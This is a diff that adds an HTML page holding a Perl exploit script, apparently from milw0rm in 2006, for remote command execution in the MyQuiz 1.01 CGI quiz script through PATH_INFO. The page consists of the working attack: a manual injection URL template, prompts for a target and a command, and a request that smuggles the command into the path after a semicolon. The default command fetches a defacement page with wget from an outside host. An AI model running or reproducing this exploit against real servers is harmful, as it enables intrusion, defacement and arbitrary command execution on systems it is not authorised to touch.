@@ -1,0 +1,39 @@
+<html><head><title>MyQuiz 1.01 (PATH_INFO) Arbitrary Command Execution Exploit</title></head><pre>#!/usr/bin/perl
+# =&gt; MyQuiz Remote Command Execution Exploit
+# -&gt; By Hessam-x  / www.hackerz.ir
+# manual exploiting --&gt; http://[target]/cgi-bin/myquiz.pl/ask/;&lt;Command&gt;|
+# SecurityFocus [bug] : http://www.securityfocus.com/archive/1/423921/30/0/threaded
+# /   |   \_____    ____ |  | __ ___________________
+#/    ~    \__  \ _/ ___\|  |/ // __ \_  __ \___   /
+#\    Y    // __ \\  \___|    &lt;\  ___/|  | \//    /
+# \___|_  /(____  /\___  &gt;__|_ \\___  &gt;__|  /_____ \
+#       \/      \/     \/     \/    \/            \/
+# Iran Hackerz Security Team
+# Hessam-x : www.hessamx.net
+
+use LWP::Simple;
+
+print &quot;-------------------------------------------\n&quot;;
+print &quot;= MyQuiz Remote Command Execution Exploit =\n&quot;;
+print &quot;=       By Hessam-x  - www.hackerz.ir     =\n&quot;;
+print &quot;-------------------------------------------\n\n&quot;;
+
+
+       print &quot;Target(www.example.com)\&gt; &quot;;
+       chomp($targ = &lt;STDIN&gt;);
+
+       print &quot;path: (/cgi-bin/myquiz.pl/ask/)\&gt;&quot;;
+       chomp($path=&lt;STDIN&gt;);
+
+       print &quot;command: (wget www.hackerz.ir/deface.htm)\&gt;&quot;;
+       chomp($comd=&lt;STDIN&gt;);
+
+
+$page=get(&quot;http://&quot;.$targ.$path) || die &quot;[-] Unable to retrieve: $!&quot;;
+print &quot;[+] Connected to: $targ\n&quot;;
+print &quot;[~] Sending exploiting request,wait....\n&quot;;
+get(&quot;http://&quot;.$targ.$path.&quot;;&quot;.$comd.&quot;|&quot;)
+print &quot;[+] Exploiting request done!\n&quot;;
+print &quot;Enjoy !&quot;;
+
+# milw0rm.com [2006-02-06]</pre></html>
